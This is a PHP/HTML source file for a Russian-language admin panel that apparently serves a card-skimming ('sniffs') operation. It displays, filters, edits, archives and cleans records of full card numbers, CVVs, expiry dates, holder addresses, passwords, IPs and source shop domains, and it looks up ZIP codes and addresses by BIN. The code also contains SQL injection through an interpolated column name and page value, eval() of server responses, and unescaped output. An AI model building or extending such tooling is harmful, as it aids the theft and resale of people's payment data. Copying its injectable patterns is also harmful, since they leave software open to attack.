<?php
require 'auth.php';
require 'config.php';

header('Content-Type: text/html; charset=utf-8');

try {
    $pdo = new PDO($dsn, $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    echo "Connection failed: " . $e->getMessage();
}

// update data in database if a field is edited
if (isset($_POST['id']) && isset($_POST['field']) && isset($_POST['value'])) {
    $id = $_POST['id'];
    $field = $_POST['field'];
    $value = $_POST['value'];
    $query = $db->prepare("UPDATE test SET $field = :value WHERE id = :id");
    $query->execute(array(':value' => $value, ':id' => $id));
}

// Pagination
$limit = 50; // Results per page
$page = isset($_GET['page']) ? $_GET['page'] : 1;
$start = ($page - 1) * $limit;

// Get total number of results
$stmt = $pdo->prepare("SELECT COUNT(*) AS count FROM ccinfonext");
$stmt->execute();
$result = $stmt->fetch();
$total = $result['count'];

// Handle search query
$search = isset($_GET['search']) ? $_GET['search'] : '';
if (!empty($search)) {
    $stmt = $pdo->prepare("SELECT * FROM ccinfonext WHERE number LIKE :search ORDER BY id ASC LIMIT $start, $limit");
    $stmt->bindValue(':search', '%'.$search.'%');
} else {
    $stmt = $pdo->prepare("SELECT * FROM ccinfonext ORDER BY id DESC LIMIT $start, $limit");
}
$stmt->execute();
$results = $stmt->fetchAll(PDO::FETCH_ASSOC);

//Приведение формата даты истечения карты к виду "MM/YY"
$messageFormatExp = ''; // Переменная для хранения сообщений

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['format_exp_date'])) {
    try {
        $pdo = new PDO($dsn, $username, $password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // SQL-запрос для обновления формата даты
        $sql = "UPDATE ccinfonext
                SET expire = CONCAT(LPAD(SUBSTRING_INDEX(expire, '/', 1), 2, '0'), '/', 
                                    RIGHT(CONCAT('0', SUBSTRING_INDEX(expire, '/', -1)), 2))
                WHERE expire IS NOT NULL";
        $stmt = $pdo->prepare($sql);
        $stmt->execute();

        $messageFormatExp = "Формат даты приведён к виду 'MM/YY'.";
    } catch (PDOException $e) {
        $messageFormatExp = "Ошибка при форматировании даты: " . $e->getMessage();
    }
    echo json_encode(['message' => $messageFormatExp]); // Возвращаем сообщение в формате JSON
    exit; // Завершаем выполнение скрипта
}
//End Приведение формата даты истечения карты к виду "MM/YY"

//Удаление мусорных записей из таблицы ccinfonext
$message = ''; // Переменная для хранения сообщений

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $pdo = new PDO($dsn, $username, $password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Массив SQL-запросов
        $queries = [
            "DELETE FROM ccinfonext WHERE LENGTH(number) < 15",
            "DELETE FROM ccinfonext WHERE LENGTH(cvv) < 3 OR LENGTH(number) < 15",
            "DELETE FROM ccinfonext WHERE number LIKE '3%' AND LENGTH(number) = 15 AND LENGTH(cvv) < 4"
        ];

        // Выполнение запросов
        foreach ($queries as $sql) {
            $stmt = $pdo->prepare($sql);
            $stmt->execute();
        }
        $message = "Все записи успешно удалены.";
    } catch (PDOException $e) {
        $message = "Ошибка при удалении записей: " . $e->getMessage();
    }
    echo json_encode(['message' => $message]); // Возвращаем сообщение в формате JSON
    exit; // Завершаем выполнение скрипта
}
//End Удаление мусорных записей из таблицы ccinfonext
// HTML code with Bootstrap styles
?>
<!DOCTYPE html>
<html>
<head>
    <title>Panel</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
	<link id="theme-stylesheet" rel="stylesheet" href="assets/css/main-dark.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css ">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
	<style>
	.modal-backdrop {
		z-index: -1 !important;
	}
	</style>
	<style>
	#message {
		margin-top: 10px;
		color: #fff;
		text-align: center;
	}
	#messageFormatExp {
		margin-top: 10px;
		color: #fff;
		text-align: center;
	}
	.error {
		color: red;
		text-align: center;
	}
	.info-icon {
		display: inline-block;
		margin-left: 5px;
		cursor: pointer;
		color: blue;
		font-weight: bold;
	}
	.tooltip {
		display: none;
		position: absolute;
		background-color: #f9f9f9;
		border: 1px solid #ccc;
		padding: 5px;
		z-index: 1000;
		border-radius: 4px;
		box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
	}
	/* Стили для спиннера */
	#spinner {
		display: none; /* По умолчанию спиннер скрыт */
		border: 3px solid #f3f3f3; /* Светло-серый */
		border-top: 3px solid #3498db; /* Синий */
		border-radius: 50%;
		width: 30px;
		height: 30px;
		animation: spin 1s linear infinite;
		margin: 20px auto; /* Центрируем спиннер */
	}

	@keyframes spin {
		0% { transform: rotate(0deg); }
		100% { transform: rotate(360deg); }
	}
	.tooltip {
		position: fixed;
		//background-color: #343a40;
		background-color: rgb(52,58,64,0.5);
		color: white;
		padding: 10px 10px;
		border-radius: 5px;
		font-size: 14px;
		z-index: 1001;
		top: 0px; /* Позиция над кнопкой */
		right: 15px;
		opacity: 1;
		transition: opacity 0.3s ease-in-out;
	}
	.logout-icon {
    transition: transform 0.3s ease, color 0.3s ease; /* Плавный переход */
}
/*
.logout-icon:hover {
    content: "🚪➡️"; /* Изменяем символ на распахнутую дверь */
    transform: scale(1.2); /* Легкое увеличение иконки */
    color: #ffcc00; /* Меняем цвет для акцента */
}
*/
    </style>
</head>
<body>
<!-- Выдвигающаяся панель -->
<div style="display:flex; flex-direction:row">
<div id="menuToggle" class="menu-toggle">☰</div>
<div>
<a href="logout.php" 
   id = "logoutButton"
   class="btn logout-icon" 
   style="position: fixed;
          right: 70px;
          top: 15px;
          cursor: pointer;
          font-size: 52px;
          color: white;
          border-radius: 5px;
          line-height: 43px;
          z-index: 1000;"><i class="fas fa-door-closed"></i> <!-- Иконка закрытой двери --></a>
	<div id="tooltip" class="tooltip" style="display: none;">Выход</div>
	<script>
	const button = document.getElementById('logoutButton');
	const tooltip = document.getElementById('tooltip');

	button.addEventListener('mouseenter', () => {
		tooltip.style.display = 'block';
		document.querySelector('#logoutButton i').className = 'fa-solid fa-door-open';
		setTimeout(() => {
			tooltip.style.opacity = '1';
		}, 10); // Задержка для корректного отображения
	});

	button.addEventListener('mouseleave', () => {
		tooltip.style.opacity = '0';
		document.querySelector('#logoutButton i').className = 'fas fa-door-closed';
		setTimeout(() => {
			tooltip.style.display = 'none';
		}, 300); // Задержка перед скрытием
	});
	</script>
</div>
</div>
<div id="sidebar" class="sidebar">
	
	<div class="toggle_switch" style="float: left;margin: 20px; margin-left:5px;">
		<input id="theme-toggle" type="checkbox" class="switch_3">
		<svg class="checkbox" xmlns="http://www.w3.org/2000/svg" style="isolation:isolate" viewBox="0 0 168 80">
		   <path class="outer-ring" d="M41.534 9h88.932c17.51 0 31.724 13.658 31.724 30.482 0 16.823-14.215 30.48-31.724 30.48H41.534c-17.51 0-31.724-13.657-31.724-30.48C9.81 22.658 24.025 9 41.534 9z" fill="none" stroke="#138496" stroke-width="3" stroke-linecap="square" stroke-miterlimit="3"></path>
		   <path class="is_checked" d="M17 39.482c0-12.694 10.306-23 23-23s23 10.306 23 23-10.306 23-23 23-23-10.306-23-23z"></path>
			<path class="is_unchecked" d="M132.77 22.348c7.705 10.695 5.286 25.617-5.417 33.327-2.567 1.85-5.38 3.116-8.288 3.812 7.977 5.03 18.54 5.024 26.668-.83 10.695-7.706 13.122-22.634 5.418-33.33-5.855-8.127-15.88-11.474-25.04-9.23 2.538 1.582 4.806 3.676 6.66 6.25z"></path>
		</svg>
		<script src="assets/js/theme-switcher.js"></script>
	</div>
    <div id="menu" style="display:flex; flex-direction: column; margin-top:100px">	
		<button id="btn-sniffs-info" class="btn btn-info" style="padding:10px;margin:10px 10px"><a href="sniffs-stat/index.php" style="padding:10px;margin:10px 10px">Статистика - сниффы</a></button>
	</div>
	<div class="separator"></div>
	<div style="display:flex; flex-direction: column;">
		<button id="update-countries" class="btn btn-info" style="padding:10px;margin:10px 10px;">Обновить страны</button>
		<button id="update-states" class="btn btn-info" style="padding:10px;margin:10px 10px">Обновить штаты</button>
		<button id="update-city-countries-api" class="btn btn-info" style="padding:10px;margin:10px 10px">Обновить город, страну (API)</button>
		<div id="spinner"></div>
		
		<button id="result" style="display: none; padding:10px;margin:10px 10px;overflow-y: auto;max-height: 300px;"></button>
	</div>
	
	<div class="separator"></div>
	
	<div style="display:flex; flex-direction: column;">
		<button id="openModalBtn" class="btn btn-info" style="padding:10px;margin:10px 10px;">Поиск ZIP по БИНам</button>

		<!-- Модальное окно -->
		<div class="modal fade" id="binModal" tabindex="-1" role="dialog" aria-labelledby="binModalLabel" aria-hidden="true">
			<div class="modal-dialog" role="document">
				<div class="modal-content">
					<div class="modal-header">
						<h5 class="modal-title" id="binModalLabel">Введите БИНы и период времени</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
							<span aria-hidden="true">&times;</span>
						</button>
					</div>
					<div class="modal-body">
						<input type="text" id="binInput" class="form-control" placeholder="Введите БИНы через запятую">
						<div class="calendar-wrapper mt-3">
							<div class="form-group">
								<label for="start-date">Начальная дата:</label>
								<input type="date" name="start_date_zip" id="start-date_zip" class="form-control" required>
							</div>
							<div class="form-group">
								<label for="end-date">Конечная дата:</label>
								<input type="date" name="end_date_zip" id="end-date_zip" class="form-control" required>
							</div>
						</div>
						<div class="results mt-3" id="results"></div> <!-- Результаты внутри модального окна -->
					</div>
					<div class="modal-footer">
						<button id="searchBtn" class="btn btn-success">Найти zip</button>
						<button type="button" class="btn btn-secondary" data-dismiss="modal">Закрыть</button>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div style="display:flex; flex-direction: column;">
		<button id="openModalBtnAddressSearch" class="btn btn-info" style="padding:10px;margin:10px 10px;">Поиск адреса по БИНам</button>

		<!-- Модальное окно -->
		<div class="modal fade" id="binModalAddressSearch" tabindex="-1" role="dialog" aria-labelledby="binModalLabel" aria-hidden="true">
			<div class="modal-dialog" role="document">
				<div class="modal-content">
					<div class="modal-header">
						<h5 class="modal-title" id="binModalLabelAddressSearch">Введите БИНы и период времени</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
							<span aria-hidden="true">&times;</span>
						</button>
					</div>
					<div class="modal-body">
						<input type="text" id="binInputAddressSearch" class="form-control" placeholder="Введите БИНы через запятую">
						<div class="calendar-wrapper mt-3">
							<div class="form-group">
								<label for="start-date">Начальная дата:</label>
								<input type="date" name="start_date_address" id="start-date_address" class="form-control" required>
							</div>
							<div class="form-group">
								<label for="end-date">Конечная дата:</label>
								<input type="date" name="end_date_zip" id="end-date_address" class="form-control" required>
							</div>
						</div>
						<div class="results mt-3" id="results-address"></div> <!-- Результаты внутри модального окна -->
					</div>
					<div class="modal-footer">
						<button id="searchBtnAddressSearch" class="btn btn-success">Найти адрес</button>
						<button type="button" class="btn btn-secondary" data-dismiss="modal">Закрыть</button>
					</div>
				</div>
			</div>
		</div>
	</div>
	
	<div class="separator"></div>
	
	<div style="display:flex; flex-direction: column;">
		<button id="format-exp-date" name="format_exp_date" class="btn btn-info" style="padding:10px;margin:10px 10px;width: 230px;">Форматировать дату карт</button>
		<div id="messageFormatExp"></div>
		<button id="show-garbage" name="show_garbage" class="btn btn-info" style="padding:10px;margin:10px 10px;width: 230px;">Выгрузить мусорные записи</button>
		<form id="deleteGarbageForm" method="POST">
			<button type="submit" name="delete_all_garbage" class="btn btn-info" style="padding:10px;margin:10px 10px;width: 230px;">Удалить мусорные записи</button>
		</form>
		<div id="message"></div>
	</div>
	
	<div class="separator"></div>
	
	<!--Выборка просроченных и истекающих карт по полю expire-->
	<div style="display:flex; flex-direction: column;">
		<form method="POST" action="get_records.php">
			<button type="submit" name="fetch_records" class="btn btn-info" style="padding:10px;margin:10px 10px;width: 230px;">Просроченные карты</button>
		</form>
	</div>
	<!--End Выборка просроченных и истекающих карт по полю expire-->
	
</div>
<script>
document.getElementById('menuToggle').addEventListener('click', function() {
    const sidebar = document.getElementById('sidebar');
    if (sidebar.style.right === '0px') {
        sidebar.style.right = '-250px'; // Скрыть панель
    } else {
        sidebar.style.right = '0px'; // Показать панель
    }
});
</script>
<!-- End Выдвигающаяся панель -->

<script>
    // Открытие модального окна
    document.getElementById('openModalBtn').addEventListener('click', function() {
        $('#binModal').modal('show');
        document.getElementById('results').innerHTML = ''; // Очистка предыдущих результатов
    });

    // Обработка поиска ZIP-кодов
    document.getElementById('searchBtn').addEventListener('click', async () => {
        const binInput = document.getElementById('binInput').value;
        const startDate = document.getElementById('start-date_zip').value;
        const endDate = document.getElementById('end-date_zip').value;
        const bins = binInput.split(',').map(bin => bin.trim()).filter(bin => bin);

        if (bins.length === 0) {
            alert('Введите хотя бы один БИН.');
            return;
        }

        try {
            const response = await fetch('get_zips.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ bins, start_date_zip: startDate, end_date_zip: endDate }),
            });

            if (!response.ok) {
                throw new Error('Ошибка сети');
            }

            const data = await response.json();
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = '';

            for (const [bin, zips] of Object.entries(data)) {
                resultsDiv.innerHTML += `<strong>"${bin}":</strong> ${zips.join('; ')};<br>--------<br>`;
            }

            if (Object.keys(data).length > 0) {
                // Можно оставить модальное окно открытым, чтобы пользователь мог видеть результаты
            } else {
                alert('Нет результатов для введённых БИНов.');
            }
        } catch (error) {
            console.error('Ошибка:', error);
            alert('Произошла ошибка при поиске ZIP кодов.');
        }
    });
</script>
<script>
    // Открытие модального окна для поиска Address по BIN
    document.getElementById('openModalBtnAddressSearch').addEventListener('click', function() {
        $('#binModalAddressSearch').modal('show');
        document.getElementById('results-address').innerHTML = ''; // Очистка предыдущих результатов
    });

    // Обработка поиска адресов
    document.getElementById('searchBtnAddressSearch').addEventListener('click', async () => {
        const binInputAddressSearch = document.getElementById('binInputAddressSearch').value;
        const startDate = document.getElementById('start-date_address').value;
        const endDate = document.getElementById('end-date_address').value;
        const bins = binInputAddressSearch.split(',').map(bin => bin.trim()).filter(bin => bin);

        if (bins.length === 0) {
            alert('Введите хотя бы один БИН.');
            return;
        }

        try {
            const response = await fetch('get_addresses.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ bins, start_date_address: startDate, end_date_address: endDate }),
            });

            if (!response.ok) {
                throw new Error('Ошибка сети');
            }

            const data = await response.json();
            const resultsDiv = document.getElementById('results-address');
            resultsDiv.innerHTML = '';

            for (const [bin, addresses] of Object.entries(data)) {
                resultsDiv.innerHTML += `<strong>"${bin}":</strong> ${addresses.join('; ')};<br>--------<br>`;
            }

            if (Object.keys(data).length > 0) {
                // Можно оставить модальное окно открытым, чтобы пользователь мог видеть результаты
            } else {
                alert('Нет результатов для введённых БИНов.');
            }
        } catch (error) {
            console.error('Ошибка:', error);
            alert('Произошла ошибка при поиске адресов.');
        }
    });
</script>


    <div class="margin-top:20px">
		<div class="container text-center">
			<button id="check-bins-api" class="btn btn-primary" style="margin: 0 auto; width:250px">Обновить информацию по BIN</button>
			<div id="loading">
				<div class="spinner-border" role="status"></div>
				<p>Поиск бинов для обновления...</p>
			</div>
		</div>
		<br>
		
		<div style="display:flex;flex-direction:row;column-gap: 29%;">
			<div style="display:flex;flex-direction:column;width: 250px;">
				<button id="show-statistics" class="btn btn-info">Показать статистику</button>
				<button id="show-archive" class="btn btn-info" style="margin-top: 10px;">Показать архив</button>
				<button id="show-additional-statistics" class="btn btn-info" style="margin-top: 10px;">Показать доп. статистику</button>
			</div>
			<h1 style="margin-top:20px">Главная панель</h1>
		</div>
		<script>
			document.getElementById('show-statistics').addEventListener('click', function() {
					const showStatUrl = 'show_statistics.php';
						window.open(showStatUrl, '_blank');
			});
		</script>
		<script>
			document.getElementById('show-additional-statistics').addEventListener('click', function() {
					const showStatUrl = 'show_additional_statistics.php';
						window.open(showStatUrl, '_blank');
			});
		</script>
		
			<form method="POST" action="get_records.php">			
				<div style="display:flex; flex-direction:column;width: 100%;">
					<div class="calendar-wrapper">
						<div class="form-group">
							<label for="start-date">Начальная дата:</label>
							<input type="date" name="start_date" id="start-date" class="form-control" required>
						</div>
						<div class="form-group">
							<label for="end-date">Конечная дата:</label>
							<input type="date" name="end_date" id="end-date" class="form-control" required>
						</div>
					</div>
					<div class="calendar-wrapper">
						<div class="form-group">
							<label for="start-date">Сумма заказа:</label>
							<input id="order-sum-start" type="text" name="order_sum_start" class="form-control" placeholder="От">
						</div>
						<div class="form-group">
							<label for="end-date">Сумма заказа:</label>
							<input id="order-sum-end" type="text" name="order_sum_end" class="form-control" placeholder="До">
						</div>
					</div>
					
					<div class="input-group mb-3 w-25 mx-auto" style="display:flex; flex-direction:row;justify-content: center;width: 100%;">
						<div class="input-group-append" style="margin: 0 auto;">
							<input id="full-number" type="text" name="full_number" class="form-control" placeholder="Номер карты" style="width:200px; border-radius: 0px !important; margin-bottom:10px; border-bottom-left-radius: .25rem !important; border-top-left-radius: .25rem !important;">
							<input id="card-brand" type="text" name="card_brand" class="form-control" placeholder="Visa, Mastercard, etc" style="width:170px; border-radius: 0px !important; margin-bottom:10px">
							<input id="card-type" type="text" name="card_type" class="form-control" placeholder="Credit/Debit" style="width:170px; border-radius: 0px !important; margin-bottom:10px">
							<input id="card-level" type="text" name="card_level" class="form-control" placeholder="Card Level" style="width:170px; border-radius: 0px !important; margin-bottom:10px">
							<input id="card-bank" type="text" name="card_bank" class="form-control" placeholder="Банк-эмитент" style="width:200px; border-radius: 0px !important; margin-bottom:10px; border-bottom-right-radius: .25rem !important; border-top-right-radius: .25rem !important;">
						</div>
						<div class="input-group-append" style="margin: 0 auto;">
							<input id="card-bin" type="text" name="card_number" class="form-control" placeholder="BIN" style="width:300px; border-bottom-right-radius: 0px !important;border-top-right-radius: 0px !important;">
							<input id="expiration" type="text" name="expiration" class="form-control" placeholder="Exp" style="width:100px; border-radius: 0px !important">
							<input id="country" type="text" name="country" class="form-control" placeholder="Страна" style="width:200px; border-radius: 0px !important">
							<input id="city" type="text" name="city" class="form-control" placeholder="Город" style="width:200px; border-radius: 0px !important">
							<input id="state" type="text" name="state" class="form-control" placeholder="Штат" style="width:200px; border-radius: 0px !important">							
							<input id="zip" type="text" name="zip" class="form-control" placeholder="Zip" style="width:100px; border-bottom-right-radius: .25rem !important; border-top-right-radius: .25rem !important; border-bottom-left-radius: 0px !important;border-top-left-radius: 0px !important;">
						</div>
						<div class="input-group-append" style="margin: 0 auto; margin-top: 10px">
							<input id="comment" type="text" name="comment" class="form-control" placeholder="Комментарий" style="width:300px; border-bottom-left-radius: .25rem !important; border-top-left-radius: .25rem !important; border-bottom-right-radius: .25rem !important; border-top-right-radius: .25rem !important;">
							<input id="domain-name" type="text" name="domain-name" class="form-control" placeholder="Шоп" style="width:300px; border-bottom-right-radius: .25rem !important; border-top-right-radius: .25rem !important;">
						</div>
					</div>
					<button type="submit" class="btn btn-primary" style="width: 150px; margin: 0 auto;">Фильтровать</button>					
				</div>
				
			</form>
			<div style="width:100%; display:flex;">
				<button id="clear-filter" type="submit" class="btn btn-info" style="width: 200px; margin: 0 auto; margin-top: 5px;">Очистить фильтры</button>
			</div>
		
		<button id="delete-selected" class="btn btn-danger" style="margin-bottom: 10px; float:right">Удалить и перенести в архив</button>
		
		<nav aria-label="Page navigation">
			<ul class="pagination">
				<?php 
				$pages = ceil($total / $limit);
				for ($i = 1; $i <= $pages; $i++) {
					$active = $i == $page ? 'active' : '';
					echo '<li class="page-item '.$active.'"><a class="page-link" href="?page='.$i.'">'.$i.'</a></li>';
				}
				?>
			</ul>
		</nav>
		
        <table class="table">
            <thead>
                <tr>
                    <th>Actions</th>
					<th>Select</th>
					<th>ID</th>
                    <th>Number</th>
                    <th>Expire</th>
                    <th>CVV</th>
                    <th>Holder</th>
                    <th>ZIP</th>
                    <th>Address</th>
                    <th>City</th>
                    <th>State</th>
                    <th>Country</th>
                    <th>Phone</th>
                    <th>Email</th>
                    <th>Company</th>
                    <th>DOB</th>
                    <th>Password</th>
                    <th>Ipholder</th>
                    <th>UI</th>
                    <th>Domain</th>
                    <th>Raw</th>
                    <th>CC Date</th>
                    <th>BIN</th>
                    <th>AH</th>
                    <th>SO</th>
                    <th>PAD</th>
                    <th>Chain</th>
                    <th>Counter</th>
                    <th>Total Count</th>
                    <th>Brand</th>
                    <th>Type</th>
                    <th>Bank</th>
                    <th>Level</th>
                </tr>
            </thead>
            <tbody>
				<?php foreach ($results as $row): ?>
				<tr>
					<td>
						<div class="d-flex">
							<a href="edit.php?id=<?php echo $row['id']; ?>" class="btn btn-primary btn-sm" style="width: 40px!important; margin-right: 1px;">Edit</a>
							<a href="delete.php?id=<?php echo $row['id']; ?>" class="btn btn-danger btn-sm" style="width: 40px!important">X</a>
						</div>						
					</td>
					<td><input type="checkbox" class="record-checkbox" style="width: 29px; height: 29px" value="<?php echo $row['id']; ?>"></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="id"><?php echo $row['id']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="number"><?php echo $row['number']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="expire"><?php echo $row['expire']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="cvv"><?php echo $row['cvv']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="holder"><?php echo $row['holder']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="zip"><?php echo $row['zip']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="address"><?php echo $row['address']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="city"><?php echo $row['city']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="state"><?php echo $row['state']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="country"><?php echo $row['country']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="phone"><?php echo $row['phone']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="email"><?php echo $row['email']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="company"><?php echo $row['company']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="dob"><?php echo $row['dob']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="password"><?php echo $row['password']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="ipholder"><?php echo $row['ipholder']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="ui"><?php echo $row['ui']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="domain"><?php echo $row['domain']; ?></td>
					<td ondblclick="makeEditable(this)" class="tdwidth500 edit" data-id="<?php echo $row['id']; ?>" data-field="raw"><?php echo $row['raw']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="ccdate"><?php echo $row['ccdate']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="bin"><?php echo $row['bin']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="ah"><?php echo $row['ah']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="so"><?php echo $row['so']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="pad"><?php echo $row['pad']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="chain"><?php echo $row['chain']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="counter"><?php echo $row['counter']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="totalcount"><?php echo $row['totalcount']; ?></td>					
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="totalcount"><?php echo $row['brand']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="totalcount"><?php echo $row['type']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="totalcount"><?php echo $row['bank']; ?></td>
					<td ondblclick="makeEditable(this)" class="edit" data-id="<?php echo $row['id']; ?>" data-field="totalcount"><?php echo $row['level']; ?></td>
				<?php endforeach; ?>
			</tbody>
		</table>
		<nav aria-label="Page navigation">
			<ul class="pagination">
				<?php 
				$pages = ceil($total / $limit);
				for ($i = 1; $i <= $pages; $i++) {
					$active = $i == $page ? 'active' : '';
					echo '<li class="page-item '.$active.'"><a class="page-link" href="?page='.$i.'">'.$i.'</a></li>';
				}
				?>
			</ul>
		</nav>
	</div>
</body>
</html>

<script>
function makeEditable(element) {
	element.contentEditable = true;
	element.focus();
}

	$(document).ready(function() {
    // update field value when Enter key is pressed
    $(document).on('keypress', '.edit', function(event) {
        if (event.keyCode === 13) { // 13 is the code for the Enter key
            event.preventDefault();
            var id = $(this).attr('data-id');
            var field = $(this).attr('data-field');
            var value = $(this).text();
            $.ajax({
                url: 'update.php',
                type: 'POST',
                data: { id: id, field: field, value: value },
                success: function() {
                    location.reload(); // reload the page to see the updated data
                }
            });
        }
    });
	
	// create new record when Create button is clicked
    $(document).on('click', '.create', function() {
        $.ajax({
            url: 'create.php',
            type: 'POST',
            data: { name: '', number: '' },
            success: function() {
                location.reload(); // reload the page to see the new record
            }
        });
    });
});


	$(document).ready(function() {
		$('#delete-selected').on('click', function() {
			const ids = [];
			$('.record-checkbox:checked').each(function() {
				ids.push($(this).val());
			});

			if (ids.length > 0) {
				//if (confirm("Вы уверены, что хотите удалить выбранные записи?")) {
					$.ajax({
						url: 'delete_multiple.php',
						type: 'POST',
						data: { ids: ids },
						success: function(response) {
							location.reload(); // Перезагрузить страницу для обновления данных
						}
					});
				}
			//} 
			else {
				alert("Пожалуйста, выберите хотя бы одну запись.");
			}
		});
	});
</script>

<script>
	const archiveUrl = '<?php echo ARCHIVE_URL; ?>';
	document.getElementById('show-archive').addEventListener('click', function() {
		window.open(archiveUrl, '_blank');
	});
</script>

<script>
$(document).ready(function() {
	$('#check-bins-api').click(function() {
		$('#loading').show(); // Показываем спиннер

		$.ajax({
			url: 'check-bins-api.php',
			type: 'GET',
			success: function(response) {
				//console.log(response);
				$('#loading').hide(); // Скрываем спиннер
				eval(response); // Выполняем JavaScript код из ответа
			},
			error: function() {
				$('#loading').hide(); // Скрываем спиннер в случае ошибки
				alert('Произошла ошибка при обращении к серверу.');
			}
		});
	});
});
</script>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const fields = [
        'start-date', 'end-date', 'full-number', 'card-bin', 'card-brand', 'card-type', 'card-level', 'card-bank', 'country', 'city', 'state', 'zip'
    ];

    // Восстановление значений из localStorage
    fields.forEach(field => {
        const element = document.querySelector(`#${field}`);
        if (element) {
            const savedValue = localStorage.getItem(field);
            if (savedValue) {
                element.value = savedValue;
            }

            // Сохранение значения в localStorage при изменении
            element.addEventListener('input', function() {
                localStorage.setItem(field, this.value);
            });
        }
    });

    // Очистка localStorage и инпутов при нажатии на кнопку
    document.getElementById('clear-filter').addEventListener('click', function() {
        fields.forEach(field => {
            if (field !== 'start-date' && field !== 'end-date') { // Проверка на исключение
                localStorage.removeItem(field);
                const element = document.querySelector(`#${field}`);
                if (element) {
                    element.value = ''; // Очистка значения инпута
                }
            }
        });
    });
});
</script>

<script>
	document.getElementById('update-countries').addEventListener('click', function() {
		document.getElementById('result').style.display = 'block';
		fetch('update_db_countries.php')
			.then(response => response.text())
			.then(data => {
				document.getElementById('result').innerHTML = data;
			})
			.catch(error => {
				document.getElementById('result').innerText = 'Ошибка: ' + error;
			});
	});
	
	document.getElementById('update-states').addEventListener('click', function() {
		document.getElementById('result').style.display = 'block';
		fetch('update_db_states.php')
			.then(response => response.text())
			.then(data => {
				document.getElementById('result').innerHTML = data;
			})
			.catch(error => {
				document.getElementById('result').innerText = 'Ошибка: ' + error;
			});
	});
	
	document.getElementById('update-city-countries-api').addEventListener('click', function() {
		const spinner = document.getElementById('spinner');
		spinner.style.display = 'block';
		document.getElementById('result').style.display = 'block';
		//document.getElementById('result').style.display = 'none';
		fetch('update_city_country-api.php')
			.then(response => response.json())
			.then(data => {
				spinner.style.display = 'none';
				const resultDiv = document.getElementById('result');
				if (data.status === 'success') {
					if (data.updatedIds && data.updatedIds.length > 0) {
						resultDiv.innerHTML = 'Обновлены записи с ID: ' + data.updatedIds.join(', ');
					} else {
						resultDiv.innerHTML = data.message;
					}
				} else {
					resultDiv.innerHTML = 'Ошибка: ' + data.message;
				}
			})
			.catch(error => {
				spinner.style.display = 'none';
				document.getElementById('result').innerHTML = 'Произошла ошибка: ' + error;
			});
	});
</script>
